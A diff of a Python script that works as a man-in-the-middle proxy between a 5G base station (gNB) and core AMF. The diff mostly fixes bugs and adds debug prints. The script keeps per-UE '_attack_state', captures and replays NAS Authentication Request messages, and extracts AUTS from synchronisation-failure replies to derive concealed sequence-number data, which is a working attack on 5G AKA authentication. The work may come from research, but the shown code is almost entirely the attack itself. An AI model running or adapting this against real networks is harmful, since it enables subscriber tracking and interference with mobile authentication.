@@ -34,7 +34,7 @@ CAUSE_SYNC_FAILURE = 0x15
 # NGAP procedure codes
 PROC_INITIAL_UE = 15
 PROC_UPLINK_NAS = 46
-PROC_DOWNLINK_NAS = 45
+PROC_DOWNLINK_NAS = 4
 
 # PPID for AMF, else failure
 NAS_PPID = 60
@@ -74,9 +74,12 @@ def get_nas_msg_type(nas_bytes: bytes) -> int | None:
     try:
         msg, err = parse_NAS5G(nas_bytes)
         if err:
+            # print(f"DEBUG parse error: {err}")
             return None
-        return msg["Type"].get_val()
-    except Exception:
+        # print(f"DEBUG NAS raw val: {msg.show()}")
+        return msg["5GMMHeader"]["Type"].get_val()
+    except Exception as e:
+        print(f"ERROR - get_nas_msg_type: {e}")
         return None
 
 def get_nas_msg_fail_cause(nas_bytes: bytes) -> int | None:
@@ -84,7 +87,9 @@ def get_nas_msg_fail_cause(nas_bytes: bytes) -> int | None:
         msg, err = parse_NAS5G(nas_bytes)
         if err:
             return None
-        return msg["5GMMAuthenticationFailure"]["5GMMCause"].get_val()
+        # print(f"DEBUG NAS format: {msg.show()}")
+
+        return msg["5GMMCause"].get_val()[0]
     except Exception:
         return None
 
@@ -120,10 +125,7 @@ def get_auts (nas_bytes: bytes) -> bytes | None:
         msg, err = parse_NAS5G(nas_bytes)
         if err:
             return None
-        authfailparam = msg["5GMMAuthenticationFailure"]["AuthenticationFailureParameter"]
-        if authfailparam.get_trans():
-            return None
-        return authfailparam["V"].get_val()
+        return msg["AUTS"]["V"].get_val()
     except Exception as e:
         print(f"ERROR - AUTS extraction failed: {e}")
         return None
@@ -173,8 +175,8 @@ def get_state(ran_ue_id: int) -> dict | None:
 def set_phase(ran_ue_id: int, phase: str, **kwargs):
     with _state_lock:
         state = _attack_state.get(ran_ue_id)
-        if s:
-            state"phase"] = phase
+        if state:
+            state["phase"] = phase
             state.update(kwargs)
 
 def repeat_replay(gnb_sock, ran_ue_id: int):
@@ -230,23 +232,26 @@ def uplink(gnb_sock, amf_sock):
 
                 if nas and state:
                     msg_type = get_nas_msg_type(nas)
+                    print("message type",msg_type)
                     
                     # AUTH RESPONSE
                     if msg_type == NAS_AUTH_RESPONSE:
                         print(f"Auth Response (accepted) — RAN-UE: {ran_ue_id}, phase: {state['phase']}")
                         if state["phase"] == "await_baseline" or state["phase"] == "await_accept":
-                            inject_replay(gnb_sock, ran_ue_id)
+                            repeat_replay(gnb_sock, ran_ue_id)
                             continue
                     
                     # AUTH FAILURE
                     if msg_type == NAS_AUTH_FAILURE:
                         failure_cause = get_nas_msg_fail_cause(nas)
+                        # print("failure cause",failure_cause)
                          
-                        if cause == CAUSE_MAC_FAILURE:
+                        if failure_cause == CAUSE_MAC_FAILURE:
                             print(f"MAC Failure — RAN-UE: {ran_ue_id} (not target or wrong challenge)")
 
-                        elif cause == CAUSE_SYNC_FAILURE and state["phase"] == "await_sync":
+                        elif failure_cause == CAUSE_SYNC_FAILURE and state["phase"] == "await_sync":
                             auts = get_auts(nas)
+                            print("autn",auts)
                             if auts:
                                 conc_star = auts[:6]
                                 conc_int  = int.from_bytes(conc_star, "big")
@@ -271,6 +276,8 @@ def uplink(gnb_sock, amf_sock):
                                     else:
                                         set_phase(ran_ue_id, "await_accept", j=j)
                         
+                            continue
+                        
             amf_sock.sctp_send(data, ppid=NAS_PPID)
 
         except Exception as e:
@@ -290,6 +297,7 @@ def downlink(gnb_sock, amf_sock):
 
             pdu  = decode_ngap(data)
             proc = get_procedure_code(pdu) if pdu else None
+            print(proc)
 
             if pdu and proc == PROC_DOWNLINK_NAS:
                 ran_ue_id = get_ran_ue_id(pdu)
@@ -299,7 +307,7 @@ def downlink(gnb_sock, amf_sock):
                     msg_type = get_nas_msg_type(nas)
 
                     if msg_type == NAS_AUTH_REQUEST:
-                        
+                        print(f"Downlink NAS AUTH REQUEST — RAN-UE-NGAP-ID: {ran_ue_id}")
                         state = get_state(ran_ue_id)
 
                         if state is None:
@@ -309,6 +317,7 @@ def downlink(gnb_sock, amf_sock):
                         if state["phase"] == "await_baseline":
                             with _state_lock:
                                 state["replay_pdu"] = data
+                        
 
             gnb_sock.sctp_send(data, ppid=NAS_PPID)
 
